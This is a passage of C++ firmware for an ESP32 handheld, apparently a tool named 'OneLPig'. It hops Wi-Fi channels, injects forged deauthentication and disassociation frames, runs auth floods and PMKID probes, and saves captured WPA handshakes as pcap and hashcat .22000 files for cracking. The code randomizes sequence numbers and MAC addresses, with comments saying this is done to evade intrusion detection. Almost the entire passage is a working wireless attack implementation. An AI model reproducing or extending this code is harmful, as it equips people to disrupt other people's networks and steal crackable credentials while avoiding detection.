    s_pendingLearn = false;
    memcpy(bssid, s_pendingLearnBssid, 6);
    portEXIT_CRITICAL(&s_pendingMux);
    const BeaconSlot* b = findBeacon(bssid);
    if (!b || !b->ssid[0]) return;

    char hiddenStem[40], hiddenName[Storage::FILE_NAME_MAX], hiddenPath[80];
    CapName::buildStem("", bssid, hiddenStem, sizeof(hiddenStem));
    snprintf(hiddenName, sizeof(hiddenName), "%s.pcap", hiddenStem);
    snprintf(hiddenPath, sizeof(hiddenPath), "%s%s", PREFIX, hiddenName);
    if (!SD.exists(hiddenPath)) return; // nothing was ever written under HIDDEN

    // Same file we're actively streaming into — close it before renaming.
    if (s_fileOpen && sameBssid(s_fileBssid, bssid)) closeFile();

    char newName[Storage::FILE_NAME_MAX], newPath[80];
    makeFilename(bssid, newName);
    snprintf(newPath, sizeof(newPath), "%s%s", PREFIX, newName);
    if (strcmp(hiddenPath, newPath) == 0) return; // name didn't actually change
    if (SD.exists(newPath)) return;               // don't clobber an existing file

    if (!SD.rename(hiddenPath, newPath)) {
        Serial.printf("[CAP] rename %s -> %s failed\n", hiddenName, newName);
        return;
    }
    Serial.printf("[CAP] %s -> %s (ssid learned)\n", hiddenName, newName);

    // Splice the SSID-revealing frame into the renamed pcap. Without this,
    // Hc22000::convertPcap() run later on this file would still see nothing
    // but the original hidden beacon and could never rebuild a crackable hash.
    File f = SD.open(newPath, "a");
    if (!f) return;
    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
    uint8_t rtLen = Pcap::buildRadiotap(rt, b->channel, b->rssi, s_fatPcap);
    Pcap::PacketHeader ph;
    uint32_t ts = millis();
    ph.tsSec   = ts / 1000;
    ph.tsUsec  = (ts % 1000) * 1000;
    ph.inclLen = (uint32_t)(rtLen + b->len);
    ph.origLen = ph.inclLen;
    f.write((uint8_t*)&ph, sizeof(ph));
    f.write(rt, rtLen);
    f.write(b->frame, b->len);
    f.close();
}

static void drainRing() {
    // Process any pending "SSID just learned for a hidden BSSID" rename
    // FIRST, before writing this tick's queued frames. makeFilename() (via
    // ssidForBssid()) reads the SSID straight out of the live beacon table,
    // which storeBeacon() updates the INSTANT a beacon reveals it - not
    // when the rename actually runs. If we wrote frames first: an EAPOL
    // for a BSSID whose SSID was JUST learned would already compute the
    // new (real-name) path in openFileForBssid(), find nothing there yet,
    // and start a brand-new file - while the earlier frames for that same
    // BSSID stay stranded under the old hidden-name file. The pending
    // rename then refuses to run (its target name already exists), so the
    // capture stays permanently split across two incomplete files. Doing
    // the rename first means any name that's about to change has already
    // changed by the time we compute paths for this tick's frames.
    processPendingSsidLearn();
    while (s_read != s_write) {
        const Slot& s = s_ring[s_read];
        writeFrameToFile(s);
        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
    }
    if (s_fileOpen) s_file.flush();
}

static bool isOwnAp(const uint8_t* bssid) {
    return memcmp(bssid, s_apMac, 6) == 0;
}

static bool skipPin(const uint8_t* bssid) {
    return s_pinOk && memcmp(bssid, s_pinBssid, 6) != 0;
}

// Per-BSSID sequence counter for injected mgmt frames. A static seq=0 on every
// frame is an easy tell for a WIDS/packet capture and some APs rate-limit or
// drop obviously-replayed sequence numbers; incrementing per destination
// mimics a real, ongoing 802.11 session.
struct SeqEntry { uint8_t bssid[6]; uint16_t seq; bool used; };
static SeqEntry s_seqTable[16];

static uint16_t nextSeq(const uint8_t* bssid) {
    for (uint8_t i = 0; i < 16; i++) {
        if (s_seqTable[i].used && memcmp(s_seqTable[i].bssid, bssid, 6) == 0) {
            s_seqTable[i].seq = (uint16_t)((s_seqTable[i].seq + 1) & 0x0FFF);
            return s_seqTable[i].seq;
        }
    }
    for (uint8_t i = 0; i < 16; i++) {
        if (!s_seqTable[i].used) {
            memcpy(s_seqTable[i].bssid, bssid, 6);
            s_seqTable[i].seq = (uint16_t)(esp_random() & 0x0FFF);
            s_seqTable[i].used = true;
            return s_seqTable[i].seq;
        }
    }
    return (uint16_t)(esp_random() & 0x0FFF);
}

static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
    uint8_t pkt[26] = {
        fc0, 0x00,
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(pkt + 4, dest, 6);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    uint16_t seq = nextSeq(bssid);
    pkt[22] = (uint8_t)((seq << 4) & 0xF0);
    pkt[23] = (uint8_t)((seq >> 4) & 0xFF);
    pkt[24] = s_deauthReason;
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    if (e == ESP_OK) s_cnt.framesDeauth++;
}

static Methods::Ctx buildMethodCtx() {
    Methods::Ctx ctx{};
    ctx.beacons      = s_beacons;
    ctx.beaconCount   = s_beaconCount;
    ctx.channel       = s_cnt.currentChannel;
    ctx.minRssi       = s_minRssi;
    ctx.kickBurst     = s_kickBurst;
    ctx.deauthReason  = s_deauthReason;
    ctx.bidirKick     = s_bidirKick;
    ctx.eapolTx       = s_eapolTx;
    ctx.pmkidProbe    = s_pmkidProbe;
    ctx.csaHerd       = s_csaHerd;
    ctx.authFlood     = s_authFlood;
    ctx.kickBssid     = s_kickBssid;
    ctx.kickSta       = s_kickSta;
    ctx.kickStaOk     = s_kickStaOk;
    ctx.bcast         = s_bcast;
    ctx.isOwnAp       = isOwnAp;
    ctx.skipPin       = skipPin;
    ctx.isSkipped     = isSessionSkipped;
    ctx.sendRawMgmt   = sendRawMgmt;
    ctx.framesDeauth  = &s_cnt.framesDeauth;
    // Porkchop-style knobs - methods that don't read these just ignore
    // them, no behavior change. PORKCHOP method picks them up.
    ctx.jitterMs      = s_jitterMs;
    ctx.cooldownSec   = s_cooldownSec;
    ctx.scoreThr      = s_scoreThr;
    ctx.dwellMinMs    = s_dwellMinMs;
    ctx.hsDepth       = s_hsDepth;
    // Lock-on-BSSID focus: pass the parked target to scoring methods so
    // they don't drift to a higher-scoring neighbor while we wait for
    // M2/M3/M4. Methods that don't read lockedBssid* (OURS, PAN, CSA,
    // PMKID) are unaffected.
    if (bssidLocked() && !isZeroMac(s_lockBssid)) {
        memcpy(ctx.lockedBssid, s_lockBssid, 6);
        ctx.lockedBssidActive = true;
    } else {
        ctx.lockedBssidActive = false;
    }
    ctx.dataAct       = s_dataAct;
    ctx.strictLock    = s_strictLock;
    ctx.depthHoldSec  = s_depthHoldSec;
    return ctx;
}

static void kickOnThisChannel() {
    if (!s_deauthEnabled) return;
    if (Hc22000::shouldPauseDeauth()) return;
    const Methods::Entry* tbl = methodTable();
    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
    const Methods::Entry& m = tbl[idx];
    if (s_pinOk) {
        bool seen = false;
        for (uint8_t i = 0; i < s_beaconCount; i++) {
            if (memcmp(s_beacons[i].bssid, s_pinBssid, 6) == 0) { seen = true; break; }
        }
        if (!seen) {
            // Pinned target hasn't shown up in any beacon yet. In
            // STEALTH-like packs (bidirKick=false, authFlood=false) we
            // MUST NOT broadcast deauth into the void - that would
            // blow the user's stealth even though we don't even know
            // the target is on this channel. Same rule as the global
            // guard in method_porkchop.cpp: "no deauth at all" means
            // "no deauth at all", even from the sniffer's pinned-fallback
            // path. PMKID-probe below is fine to keep going (it's not
            // a deauth), gated on s_pmkidProbe + known SSID.
            bool pinnedStealth = !s_bidirKick && !s_authFlood;
            if (!pinnedStealth) {
                uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
                for (uint8_t r = 0; r < rounds; r++) {
                    sendRawMgmt(0xC0, s_pinBssid, s_bcast);
                    sendRawMgmt(0xA0, s_pinBssid, s_bcast);
                }
            }
            if (m.probe && s_pmkidProbe && s_pinSsid[0] &&
                !Hc22000::hasPair(s_pinBssid)) {
                WSLBypasser::sendAuthentication(s_pinBssid);
                WSLBypasser::sendAssociationRequest(s_pinBssid, s_pinSsid);
            }
        }
    }
    Methods::Ctx ctx = buildMethodCtx();
    if (m.kick) m.kick(ctx);
    if (m.probe) m.probe(ctx);
}

static void maybeRotateMethod() {
    if (s_hsMethod != (uint8_t)HsMethod::AUTO) return;
    if (s_methodCount < 2) return; // nothing to rotate through
    uint16_t pairs = Hc22000::pairCount();
    if (pairs > s_pairAtSwitch) {
        s_pairAtSwitch = pairs;
        s_methodStartMs = millis();
        return;
    }
    uint32_t waitMs = (uint32_t)s_fallbackSec * 1000u;
    if (waitMs < 10000) waitMs = 10000;
    if (millis() - s_methodStartMs < waitMs) return;
    // Round-robin through every method in the table. The first entry is
    // the AUTO default; every other entry gets a turn after fallbackSec.
    s_activeMethod = (uint8_t)((s_activeMethod + 1) % s_methodCount);
    s_methodStartMs = millis();
    s_pairAtSwitch = pairs;
    setMethodTag();
    Serial.printf("[CAP] AUTO switch -> %s\n", s_cnt.methodTag);
}

void begin() {
    Storage::begin();
    Storage::ensureDir(Storage::DIR_HS);
    Storage::ensureDir(Storage::DIR_WPASEC);
    Storage::ensureDir(Storage::DIR_PWNCRACK);
    s_cnt = {};
    s_write = 0;
    s_read  = 0;
    s_running = false;
    s_mode = RunMode::Off;
    s_beaconCount = 0;
    Hc22000::reset();
}

static void startCommon(RunMode mode) {
    bool sdOk = Storage::begin();
    if (!sdOk) Serial.println("[CAP] SD missing - EAPOL counted, files may fail");

    if (s_running) stop();

    s_write = 0;
    s_read = 0;
    s_cnt = {};
    memset(s_seqTable, 0, sizeof(s_seqTable));
    s_pendingLearn = false;
    s_cnt.currentBssid[0] = 0;
    s_cnt.currentSsid[0] = 0;
    s_cnt.lastHsSsid[0] = 0;
    memset(s_lastHsBssid, 0, sizeof(s_lastHsBssid));
    memset(s_fullLoggedBssid, 0, sizeof(s_fullLoggedBssid));
    s_lastHopMs = millis();
    s_channelIdx = 0;
    s_lockUntil = 0;
    disarmLockOnBssid();
    s_kickStaOk = false;
    // Drop the beacon table from any previous session. Without this, methods
    // like PORKCHOP keep scoring stale clients/APs (BeaconSlot::clientN,
    // lastSeenMs, EMA score from the previous run) and can chase ghosts
    // on the new channel. begin() also zeros these for the very first run;
    // this keeps the stop()/startCommon() cycle symmetric.
    s_beaconCount = 0;
    s_beaconClock = 0;
    clearSkipList();
    s_skipKeyWas = false;
    s_mode = mode;
    s_hopEnabled = (mode == RunMode::Aggressive);
    s_deauthEnabled = (mode != RunMode::Light) && Config::radio().deauth;
    if (mode != RunMode::Pinned) {
        s_pinOk = false;
        memset(s_pinBssid, 0, sizeof(s_pinBssid));
        s_pinSsid[0] = 0;
    }
    s_lockOnHs = Config::radio().lockOnHs;
    s_lockMs = Config::radio().lockMs;
    s_hopMs = Config::radio().hopMs;
    s_minRssi = Config::radio().minRssi;
    s_hopSet = Config::radio().hopSet;
    s_hsMethod = Config::radio().hsMethod;
    s_fallbackSec = Config::radio().fallbackSec;
    s_kickBurst = Config::radio().kickBurst;
    s_bidirKick = Config::radio().bidirKick;
    s_eapolTx = Config::radio().eapolTx;
    s_pmkidProbe = Config::radio().pmkidProbe;
    s_csaHerd = Config::radio().csaHerd;
    s_authFlood = Config::radio().authFlood;
    s_deauthReason = Config::radio().deauthReason;
    s_fatPcap = Config::radio().fatPcap;
    // Porkchop-style knobs.
    s_jitterMs = Config::radio().jitterMs;
    s_cooldownSec = Config::radio().cooldownMs;
    s_scoreThr = Config::radio().scoreThr;
    s_dwellMinMs = Config::radio().dwellMinMs;
    s_hsDepth = Config::radio().hsDepth;
    if (s_hsDepth > 2) s_hsDepth = 2;
    if (s_dwellMinMs < 50) s_dwellMinMs = 50;
    s_dataAct = Config::radio().dataAct != 0;
    s_strictLock = Config::radio().strictLock;
    s_depthHoldSec = Config::radio().depthHoldSec;
    if (s_depthHoldSec > 30) s_depthHoldSec = 30;
    // AUTO starts on table index 0 and rotates via maybeRotateMethod().
    if (s_methodCount == 0) methodTable(); // populate s_methodCount
    // s_hsMethod on-disk layout: 0 = AUTO, 1..N = Methods::name(idx-1).
    // This must match hsMethodName()/hsMethodIndex() (settings_menu.cpp,
    // config.cpp) exactly, or the method the user picked in the Radio menu
    // (which can be ANY registered method, not just OURS/PAN) silently
    // resolves to table index 0 instead - that's what caused the bottom
    // bar's P:/M: tags to disagree with what was actually running.
    if (s_hsMethod == (uint8_t)HsMethod::AUTO || s_methodCount == 0) {
        s_activeMethod = 0;
    } else {
        uint8_t idx = (uint8_t)(s_hsMethod - 1);
        s_activeMethod = (idx < s_methodCount) ? idx : 0;
    }
    s_methodStartMs = millis();
    s_pairAtSwitch = Hc22000::pairCount();
    Methods::resetAll();
    setMethodTag();
    if (s_hopMs < 50) s_hopMs = 50;

    // SoftAP iface must exist or 802.11 TX / promiscuous often stay dead
    // after the boot fence left WIFI_OFF.
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP_STA);
    WiFi.setSleep(false);
    uint8_t hopN = 0;
    const uint8_t* hops = hopTable(&hopN);
    uint8_t startCh = 6;
    if (s_hopEnabled) startCh = hops[0];
    else if (mode == RunMode::Pinned && s_pinCh >= 1 && s_pinCh <= 13) startCh = s_pinCh;
    const char* apName = (mode == RunMode::Aggressive) ? "OneLPig AGG"
                       : (mode == RunMode::Pinned) ? "OneLPig PIN" : "OneLPig";
    if (Config::radio().randomMac) WSLBypasser::randomizeMAC();
    bool apOk = WiFi.softAP(apName, "onelpig123", startCh, 1 /* hidden */, 4);
    delay(80);
    WiFi.softAPmacAddress(s_apMac);
    Serial.printf("[CAP] wifi AP+STA hidden=%s ch=%u ap=%s\n",
                  apName, (unsigned)startCh, apOk ? "ok" : "fail");

    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(startCh, WIFI_SECOND_CHAN_NONE);
    s_cnt.currentChannel = startCh;
    s_running = true;

    if (s_pinOk) {
        noteNetwork(s_pinBssid, s_pinSsid, true);
        snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_pinBssid[0], s_pinBssid[1], s_pinBssid[2],
                 s_pinBssid[3], s_pinBssid[4], s_pinBssid[5]);
        setBarTarget(3, s_pinBssid, s_pinSsid[0] ? s_pinSsid : nullptr);
    } else {
        clearBarTarget();
    }
    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u method=%s sd=%u\n",
                  mode == RunMode::Aggressive ? "AGGRESSIVE"
                  : (mode == RunMode::Pinned ? "PINNED" : "light"),
                  (unsigned)s_hopEnabled, (unsigned)s_deauthEnabled,
                  (unsigned)s_cnt.currentChannel, s_cnt.methodTag, (unsigned)sdOk);
}

void startLight() {
    startCommon(RunMode::Light);
}

void startAggressive() {
    startCommon(RunMode::Aggressive);
}

void startPinned(uint8_t ch, const uint8_t* bssid, const char* ssid) {
    if (!bssid) return;
    s_pinOk = true;
    s_pinCh = (ch >= 1 && ch <= 13) ? ch : 6;
    memcpy(s_pinBssid, bssid, 6);
    s_pinSsid[0] = 0;
    if (ssid && ssid[0]) {
        strncpy(s_pinSsid, ssid, 32);
        s_pinSsid[32] = 0;
    }
    startCommon(RunMode::Pinned);
}

void stop() {
    if (!s_running && s_mode == RunMode::Off) return;
    bool hopped = s_hopEnabled;
    s_running = false;
    s_deauthEnabled = false;
    s_hopEnabled = false;
    s_mode = RunMode::Off;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    drainRing();
    closeFile();
    Storage::compactLoot();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    (void)hopped;
    Serial.printf("[CAP] stopped seen=%u eapol=%u written=%u deauth=%u dropped=%u\n",
                  s_cnt.framesSeen, s_cnt.framesEapol,
                  s_cnt.framesWritten, s_cnt.framesDeauth,
                  s_cnt.framesDropped);
}

bool isRunning() { return s_running; }
RunMode runMode() { return s_mode; }
bool isLocked() { return s_running && s_lockUntil != 0 && millis() < s_lockUntil && !lockStreakExpired(); }

const Counters& counters() { return s_cnt; }

bool isSkipped(const uint8_t* bssid) {
    return isSessionSkipped(bssid);
}

void setHsDepth(uint8_t depth) {
    s_hsDepth = (depth > 2) ? 2 : depth;
}

uint8_t hsDepth() {
    return s_hsDepth;
}

bool skipCurrent() {
    if (!s_running) return false;

    // Resolve target in priority order matching what the bottom bar shows:
    //   1) lock-on-BSSID (actively chasing handshake)
    //   2) last kick / EAPOL BSSID
    //   3) bar "current" MAC (last beacon / noteNetwork) — what user sees
    //   4) last HS BSSID (bar prefers lastHsSsid when set)
    //   5) pinned target
    // Previously we only used lock/kick/pin, so Z often skipped a stale
    // kick while the bar still showed another SSID — that network then
    // kept getting attacked.
    uint8_t fromBar[6];
    const uint8_t* t = nullptr;
    if (!isZeroMac(s_lockBssid)) {
        t = s_lockBssid;
    } else if (!isZeroMac(s_kickBssid)) {
        t = s_kickBssid;
    } else if (parseColonMac(s_cnt.currentBssid, fromBar)) {
        t = fromBar;
    } else if (!isZeroMac(s_lastHsBssid)) {
        t = s_lastHsBssid;
    } else if (s_pinOk && !isZeroMac(s_pinBssid)) {
        t = s_pinBssid;
    }
    if (!t) {
        Display::showToast("SKIP NONE", 900);
        return false;
    }
    if (!addSkip(t)) {
        Display::showToast("SKIP FAIL", 900);
        return false;
    }

    // Full release so the bar and radio stop sitting on this target.
    disarmLockOnBssid();
    s_lockUntil = 0;
    if (s_fileOpen && sameBssid(s_fileBssid, t)) closeFile();
    memset(s_kickBssid, 0, 6);
    memset(s_kickSta, 0, 6);
    s_kickStaOk = false;
    if (memcmp(s_lastHsBssid, t, 6) == 0) memset(s_lastHsBssid, 0, 6);
    s_cnt.currentBssid[0] = '\0';
    s_cnt.currentSsid[0] = '\0';
    s_cnt.lastHsSsid[0] = '\0';
    clearBarTarget();
    // Drop this AP from the live beacon table so scoring methods cannot
    // rediscover it until a fresh beacon arrives — and even then
    // isSessionSkipped() still blocks kick/lock/pcap for the session.
    for (uint8_t i = 0; i < s_beaconCount; ) {
        if (memcmp(s_beacons[i].bssid, t, 6) == 0) {
            if (i + 1 < s_beaconCount) {
                memmove(&s_beacons[i], &s_beacons[i + 1],
                        (size_t)(s_beaconCount - i - 1) * sizeof(s_beacons[0]));
            }
            s_beaconCount--;
            continue;
        }
        i++;
    }
    // Next hop ASAP — don't stay parked on the skipped AP's channel.
    s_lastHopMs = 0;

    // Prefer network name over MAC on the toast.
    char ssid[33];
    ssidForBssid(t, ssid);
    if (!ssid[0] && s_pinOk && memcmp(t, s_pinBssid, 6) == 0 && s_pinSsid[0])
        strncpy(ssid, s_pinSsid, sizeof(ssid) - 1);
    ssid[32] = '\0';

    char msg[28];
    if (ssid[0]) {
        char shortSsid[12];
        size_t n = 0;
        while (ssid[n] && n < 10) {
            char ch = ssid[n];
            if (ch >= 'a' && ch <= 'z') ch = (char)(ch - 32);
            shortSsid[n++] = ch;
        }
        shortSsid[n] = '\0';
        snprintf(msg, sizeof(msg), "SKIP %s", shortSsid);
    } else {
        snprintf(msg, sizeof(msg), "SKIP %02X:%02X:%02X", t[3], t[4], t[5]);
    }
    Display::showToast(msg, 1200);
    Serial.printf("[CAP] session skip %s (%02X:%02X:%02X:%02X:%02X:%02X) n=%u\n",
                  ssid[0] ? ssid : "?",
                  t[0], t[1], t[2], t[3], t[4], t[5],
                  (unsigned)s_skipN);
    return true;
}

void loop() {
    if (!s_running) return;

    // Z = skip current stuck target (session only, cleared on stop/start).
    {
        bool z = M5Cardputer.Keyboard.isKeyPressed('z') ||
                 M5Cardputer.Keyboard.isKeyPressed('Z');
        if (z && !s_skipKeyWas) skipCurrent();
        s_skipKeyWas = z;
    }

    drainRing();
    // Hc22000::feed() runs from the WiFi promiscuous IRQ; it only fills
    // in-memory slots and marks them dirty. flushPending() is where the
    // actual .22000 / .pmkid files are written to SD - safe to do here,
    // never inside the ISR.
    Hc22000::flushPending();
    maybeRotateMethod();

    // Auto-release lock-on-BSSID once HS DEPTH's requirement is met (see
    // Hc22000::hasHandshake()), or once the deadline (or the
    // lockStreakExpired() hard cap) has passed - this just clears the
    // now-stale bssid/channel bytes so they don't linger. Also releases
    // the plain s_lockUntil at the same moment, instead of coasting on it
    // for the rest of lockMs.
    //
    // DEPTH HOLD (RADIO): when hsDepth > 0 and we already have a crackable
    // pair but still want M3/M4, keep refreshing the lock deadline by
    // depthHoldSec so the radio doesn't hop away just because lockMs
    // expired without a new EAPOL refresh.
    if (bssidLocked()) {
        if (!isZeroMac(s_lockBssid) && Hc22000::hasHandshake(s_lockBssid, s_hsDepth)) {
            disarmLockOnBssid();
            s_lockUntil = 0;
        } else if (!isZeroMac(s_lockBssid) && s_hsDepth > 0 && s_depthHoldSec > 0 &&
                   Hc22000::hasPair(s_lockBssid)) {
            uint32_t holdUntil = millis() + (uint32_t)s_depthHoldSec * 1000u;
            if (s_lockBssidUntil < holdUntil) s_lockBssidUntil = holdUntil;
            if (s_lockUntil < holdUntil) s_lockUntil = holdUntil;
        }
    } else if (!isZeroMac(s_lockBssid)) {
        disarmLockOnBssid();
        // Lock ended — if bar still shows LOCK, fall back to last HS or SCAN.
        if (s_cnt.targetMode == 1) {
            if (s_cnt.lastHsSsid[0] && !isZeroMac(s_lastHsBssid))
                setBarTarget(2, s_lastHsBssid, s_cnt.lastHsSsid);
            else
                clearBarTarget();
        }
    }

    // Keep bar SSID in sync while locked (beacon may learn name after M1).
    if (bssidLocked() && !isZeroMac(s_lockBssid)) {
        char ssid[33];
        ssidForBssid(s_lockBssid, ssid);
        setBarTarget(1, s_lockBssid, ssid[0] ? ssid : nullptr);
    }

    uint32_t now = millis();

    // Porkchop-style lock-on-BSSID: if we caught an EAPOL and the target's
    // pair isn't on file yet, park on its channel so M2 (sent back from the
    // station on the SAME channel the AP is on) actually reaches us. This
    // MUST run before the plain isLocked() check below: s_lockUntil and
    // s_lockBssidUntil are armed together (same event, same lockMs), so
    // isLocked() is almost always true whenever bssidLocked() is - if its
    // early `return` came first, this channel park would never get a
    // chance to run at all.
    if (bssidLocked() && s_lockBssidCh >= 1 && s_lockBssidCh <= 13 &&
        s_cnt.currentChannel != s_lockBssidCh) {
        esp_wifi_set_channel(s_lockBssidCh, WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = s_lockBssidCh;
    }

    if (isLocked()) {
        if (now - s_lastHopMs >= 400) {
            s_lastHopMs = now;
            kickOnThisChannel();
        }
        return;
    }

    if (!s_hopEnabled) {
        if (s_pinOk && now - s_lastHopMs >= 400) {
            s_lastHopMs = now;
            kickOnThisChannel();
        }
        return;
    }
    if (now - s_lastHopMs >= s_hopMs) {
        s_lastHopMs = now;
        uint8_t hopN = 0;
        const uint8_t* hops = hopTable(&hopN);
        if (hopN == 0) return;
        s_channelIdx = (uint8_t)((s_channelIdx + 1) % hopN);
        uint8_t ch = hops[s_channelIdx];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = ch;
        kickOnThisChannel();
    }
}

} // namespace Cap
